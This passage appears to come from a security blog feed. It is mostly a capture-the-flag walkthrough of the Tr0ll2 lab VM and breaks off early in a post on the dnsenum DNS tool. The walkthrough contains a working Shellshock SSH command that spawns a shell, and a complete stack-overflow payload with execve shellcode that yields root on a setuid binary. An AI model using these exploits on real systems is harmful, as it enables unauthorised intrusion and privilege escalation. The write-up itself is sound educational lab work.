<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span> <span class="o">-</span><span class="n">t</span> <span class="s">&quot;() { :; }; /bin/bash&quot;</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
</span><span class='line'><span class="n">Linux</span> <span class="n">Tr0ll2</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">29</span><span class="o">-</span><span class="n">generic</span><span class="o">-</span><span class="n">pae</span> <span class="c">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>

<h3>Shellshock explained</h3>

<p>Because Bash is a scripting language, you can do things like defining functions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">myfunction</span><span class="p">()</span> <span class="p">{</span> <span class="n">echo</span> <span class="s">&quot;I am a function&quot;</span><span class="p">;</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then you call it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">myfunction</span>
</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="o">-</span><span class="n">f</span> <span class="n">myfunction</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">env</span>
</span><span class='line'><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</span><span class='line'><span class="n">myfunction</span><span class="o">=</span><span class="p">()</span> <span class="p">{</span>  <span class="n">echo</span> <span class="s">&quot;I am a function&quot;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="n">myfunction</span>
</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">export</span> <span class="n">shocking</span><span class="o">=</span><span class="s">&#39;() { echo &quot;This is safe&quot; ; }; echo &quot;This is NOT safe&quot;&#39;</span>
</span><span class='line'><span class="n">bash</span> <span class="o">-</span><span class="n">c</span> <span class="n">shocking</span>
</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">NOT</span> <span class="n">safe</span>
</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">safe</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>

<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>

<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>

<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
</span><span class='line'><span class="n">command</span><span class="o">=</span><span class="s">&quot;echo TRY HARDER LOL!&quot;</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G</span><span class="o">/</span><span class="n">kLMyjm</span><span class="o">/</span><span class="n">rrcQymKVqy4EgUyJ</span><span class="o">+</span><span class="mi">3</span><span class="n">Oyv7D5QV73IWECguqrINI</span><span class="o">+</span><span class="n">OuY</span><span class="o">+</span><span class="n">zIV49ykebBYR15HkBYi</span><span class="o">/</span><span class="mi">9</span><span class="n">GYZmHRD5CHq9I</span><span class="o">+</span><span class="n">zCLHv</span><span class="o">/</span><span class="mi">9</span><span class="n">Kdf9Ae</span><span class="o">+</span><span class="n">HQIaF</span><span class="o">/</span><span class="n">X</span><span class="o">/</span><span class="mi">3</span><span class="n">PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9</span><span class="o">/</span><span class="n">LXVOHfcrCZyyCc</span><span class="o">+</span><span class="n">ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9</span><span class="o">+</span><span class="n">ohdZBgGVncc1ngtW0b7mKf1u</span><span class="o">+</span><span class="n">RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69</span> <span class="n">noob</span><span class="nd">@Tr0ll2</span>
</span></code></pre></td></tr></table></div></figure>


<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ls</span> <span class="o">/</span>
</span><span class='line'><span class="nb">bin</span>   <span class="n">dev</span>  <span class="n">home</span>        <span class="n">lib</span>      <span class="n">media</span>  <span class="n">nothing_to_see_here</span>  <span class="n">proc</span>  <span class="n">run</span>   <span class="n">selinux</span>  <span class="n">sys</span>  <span class="n">usr</span>  <span class="n">vmlinuz</span>
</span><span class='line'><span class="n">boot</span>  <span class="n">etc</span>  <span class="n">initrd</span><span class="o">.</span><span class="n">img</span>  <span class="n">lost</span><span class="o">+</span><span class="n">found</span>  <span class="n">mnt</span>   <span class="n">opt</span>               <span class="n">root</span>  <span class="n">sbin</span>  <span class="n">srv</span>     <span class="n">tmp</span>  <span class="n">var</span>
</span></code></pre></td></tr></table></div></figure>


<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="nb">file</span> <span class="n">nothing_to_see_here</span><span class="o">/</span>
</span><span class='line'><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">directory</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="n">nothing_to_see_here</span><span class="o">/</span>
</span><span class='line'><span class="n">total</span> <span class="mi">4</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="n">choose_wisely</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">*</span>
</span><span class='line'><span class="n">door1</span><span class="p">:</span>
</span><span class='line'><span class="n">total</span> <span class="mi">16</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">7271</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="n">r00t</span>
</span><span class='line'>
</span><span class='line'><span class="n">door2</span><span class="p">:</span>
</span><span class='line'><span class="n">total</span> <span class="mi">20</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">8401</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="n">r00t</span>
</span><span class='line'>
</span><span class='line'><span class="n">door3</span><span class="p">:</span>
</span><span class='line'><span class="n">total</span> <span class="mi">16</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="o">.</span>
</span><span class='line'><span class="n">drwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Oct</span>  <span class="mi">4</span>  <span class="mi">2014</span> <span class="o">..</span>
</span><span class='line'><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">7273</span> <span class="n">Oct</span>  <span class="mi">5</span>  <span class="mi">2014</span> <span class="n">r00t</span>
</span></code></pre></td></tr></table></div></figure>


<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="nb">file</span> <span class="n">r00t</span>
</span><span class='line'><span class="n">r00t</span><span class="p">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">Intel</span> <span class="mi">80386</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span> <span class="p">(</span><span class="n">uses</span> <span class="n">shared</span> <span class="n">libs</span><span class="p">),</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6</span><span class="o">.</span><span class="mi">24</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mh">0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span>
</span><span class='line'><span class="n">Usage</span><span class="p">:</span> <span class="o">./</span><span class="n">r00t</span> <span class="nb">input</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door1</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span> <span class="n">lol</span>
</span><span class='line'><span class="n">lol</span>
</span></code></pre></td></tr></table></div></figure>


<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door2</span><span class="err">$</span> <span class="o">./</span><span class="n">r00t</span>
</span><span class='line'><span class="n">Good</span> <span class="n">job</span><span class="p">,</span> <span class="n">stand</span> <span class="n">by</span><span class="p">,</span> <span class="n">executing</span> <span class="n">root</span> <span class="n">shell</span><span class="o">...</span>
</span><span class='line'><span class="n">BUHAHAHA</span> <span class="n">NOOB</span><span class="err">!</span>
</span><span class='line'><span class="n">noob</span><span class="nd">@Tr0ll2</span><span class="p">:</span><span class="o">/</span><span class="n">nothing_to_see_here</span><span class="o">/</span><span class="n">choose_wisely</span><span class="o">/</span><span class="n">door2</span><span class="err">$</span>
</span><span class='line'><span class="n">Broadcast</span> <span class="n">message</span> <span class="kn">from</span> <span class="nn">noob</span><span class="nd">@Tr0ll2</span>
</span><span class='line'>  <span class="p">(</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">57</span> <span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">The</span> <span class="n">system</span> <span class="ow">is</span> <span class="n">going</span> <span class="n">down</span> <span class="k">for</span> <span class="n">reboot</span> <span class="n">NOW</span><span class="err">!</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span><span class="o">.</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 
</span><span class='line'>
</span><span class='line'>2 MINUTE HARD MODE LOL</span></code></pre></td></tr></table></div></figure>


<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see where exactly in the pattern it happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
</span><span class='line'>[*] Exact match at offset 268</span></code></pre></td></tr></table></div></figure>


<p>Taking a closer look at the registers and stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")
</span><span class='line'>
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? ()
</span><span class='line'>(gdb) info r
</span><span class='line'>eax            0x120  288
</span><span class='line'>ecx            0x0    0
</span><span class='line'>edx            0x0    0
</span><span class='line'>ebx            0xb7fd1ff4 -1208147980
</span><span class='line'>esp            0xbffffb50 0xbffffb50
</span><span class='line'>ebp            0x41414141 0x41414141
</span><span class='line'>esi            0x0    0
</span><span class='line'>edi            0x0    0
</span><span class='line'>eip            0x42424242 0x42424242
</span><span class='line'>eflags         0x210286   [ PF SF IF RF ID ]
</span><span class='line'>cs             0x73   115
</span><span class='line'>ss             0x7b   123
</span><span class='line'>ds             0x7b   123
</span><span class='line'>es             0x7b   123
</span><span class='line'>fs             0x0    0
</span><span class='line'>gs             0x33   51
</span><span class='line'>(gdb) x $esp
</span><span class='line'>0xbffffb50:   0x43434343</span></code></pre></td></tr></table></div></figure>


<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>

<p>What we have now for a functional exploit:</p>

<ul>
<li><p>268 bytes to fill the buffer</p></li>
<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
<li><p>NOP sled for padding</p></li>
<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
</ul>


<p>Ran the exploit in GDB:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
</span><span class='line'>process 1838 is executing new program: /bin/dash
</span><span class='line'>$ id
</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)</span></code></pre></td></tr></table></div></figure>


<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x90\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
</span><span class='line'># id
</span><span class='line'>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
</span><span class='line'># ls /root/   
</span><span class='line'>Proof.txt  core1  core2  core3    core4  goal  hardmode  lmao.zip  ran_dir.py  reboot
</span><span class='line'># cat /root/Proof.txt
</span><span class='line'>You win this time young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4  </span></code></pre></td></tr></table></div></figure>


<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ A visit to a fresh place will bring \
</span><span class='line'>\ strange work.                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsenum - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools/"/>
    <updated>2017-05-29T05:32:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/29/dnsenum-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at dnsenum, one of the tools that come preinstalled on Kali for DNS information gathering.</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/fwaeytens/dnsenum">https://github.com/fwaeytens/dnsenum</a></p>

<h3>dnsenum description</h3>

<blockquote><p>multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.</p>

<p>OPERATIONS:</p>

<p>1) Get the host&rsquo;s addresse (A record).</p>

<p>2) Get the namservers (threaded).</p>

<p>3) Get the MX record (threaded).</p>

<p>4) Perform axfr queries on nameservers and get BIND VERSION (threaded).</p>

<p>5) Get extra names and subdomains via google scraping (google query = &ldquo;allinurl: -www site:domain&rdquo;).</p>

<p>6) Brute force subdomains from file, can also perform recursion on subdomain that have NS records (all threaded).</p>

<p>7) Calculate C class domain network ranges and perform whois queries on them (threaded).</p>

<p>8) Perform reverse lookups on netranges ( C class or/and whois netranges) (threaded).</p>

<p>9) Write to domain_ips.txt file ip-blocks.</p></blockquote>

<h3>dnsenum options</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum -h
</span><span class='line'>dnsenum.pl VERSION:1.2.3
</span><span class='line'>Usage: dnsenum.pl [Options] &lt;domain&gt;
</span><span class='line'>[Options]:
</span><span class='line'>Note: the brute force -f switch is obligatory.
